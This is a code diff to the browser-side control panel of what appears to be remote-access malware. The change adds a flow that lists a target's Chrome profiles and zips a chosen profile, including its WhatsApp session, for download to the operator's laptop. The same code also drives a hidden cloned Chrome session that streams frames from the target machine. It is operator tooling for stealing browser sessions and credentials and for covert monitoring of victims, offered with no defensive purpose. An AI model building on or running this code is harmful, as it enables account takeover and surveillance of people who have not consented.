@@ -309,8 +309,19 @@
             socket.emit('request-chrome-profiles', activeTarget);
         };
 
+        document.getElementById('downloadWhatsappBtn').onclick = () => {
+            if (activeType === 'zip-whatsapp-list') return;
+            stopCurrentActive();
+            activeType = 'zip-whatsapp-list';
+            document.getElementById('preview-video').classList.add('hidden');
+            document.getElementById('chrome-list-container').classList.remove('hidden');
+            document.getElementById('chromeWindows').innerHTML = "<p>Loading Chrome Profiles...</p>";
+            document.getElementById('title').innerText = "Select Profile to Download: " + activeTarget;
+            socket.emit('request-chrome-profiles', activeTarget);
+        };
+
         socket.on('chrome-profiles-list', (data) => {
-            if (activeType !== 'hidden-chrome-list' || activeTarget !== data.targetId) return;
+            if ((activeType !== 'hidden-chrome-list' && activeType !== 'zip-whatsapp-list') || activeTarget !== data.targetId) return;
             const container = document.getElementById('chromeWindows');
             container.innerHTML = '';
             
@@ -324,15 +335,23 @@
             autoBtn.style.background = '#28a745';
             autoBtn.style.margin = '5px';
             autoBtn.innerText = "✨ Auto-Detect WhatsApp";
-            autoBtn.onclick = () => launchHiddenChrome(null);
+            if (activeType === 'hidden-chrome-list') {
+                autoBtn.onclick = () => launchHiddenChrome(null);
+            } else {
+                autoBtn.onclick = () => launchZipProfile(null);
+            }
             container.appendChild(autoBtn);
 
             data.profiles.forEach(profile => {
                 const btn = document.createElement('button');
-                btn.style.background = '#9c27b0';
+                btn.style.background = activeType === 'hidden-chrome-list' ? '#9c27b0' : '#e83e8c';
                 btn.style.margin = '5px';
                 btn.innerText = "👤 " + profile;
-                btn.onclick = () => launchHiddenChrome(profile);
+                if (activeType === 'hidden-chrome-list') {
+                    btn.onclick = () => launchHiddenChrome(profile);
+                } else {
+                    btn.onclick = () => launchZipProfile(profile);
+                }
                 container.appendChild(btn);
             });
         });
@@ -348,6 +367,16 @@
             socket.emit('request-hidden-chrome', { targetId: activeTarget, profileName: profileName });
         }
 
+        function launchZipProfile(profileName) {
+            if (!confirm("This will securely zip the selected Chrome Profile and download it to your laptop. This might take 1-2 minutes depending on their profile size. Proceed?")) return;
+            stopCurrentActive();
+            document.getElementById('download-progress-container').classList.remove('hidden');
+            document.getElementById('download-filename').innerText = "Zipping Chrome Profile (" + (profileName || "Auto") + ")...";
+            document.getElementById('download-progress-bar').style.width = "10%";
+            document.getElementById('download-percentage').innerText = "Zipping... (Do not close)";
+            socket.emit('request-zip-whatsapp', { targetId: activeTarget, profileName: profileName });
+        }
+
         socket.on('hidden-chrome-frame', (frameBase64) => {
             if (activeType !== 'hidden-chrome') return;
             document.getElementById('hidden-chrome-img').src = "data:image/jpeg;base64," + frameBase64;
@@ -355,15 +384,6 @@
                 document.getElementById('title').innerText = "Hidden Clone Chrome: " + activeTarget;
             }
         });
-
-        document.getElementById('downloadWhatsappBtn').onclick = () => {
-            if (!confirm("This will securely zip the target's entire WhatsApp Chrome Profile and download it to your laptop. This might take 1-2 minutes depending on their profile size. Proceed?")) return;
-            document.getElementById('download-progress-container').classList.remove('hidden');
-            document.getElementById('download-filename').innerText = "Zipping Chrome Profile...";
-            document.getElementById('download-progress-bar').style.width = "10%";
-            document.getElementById('download-percentage').innerText = "Zipping... (Do not close)";
-            socket.emit('request-zip-whatsapp', activeTarget);
-        };
 
         socket.on('whatsapp-zip-ready', (data) => {
             if (activeTarget !== data.targetId) return;
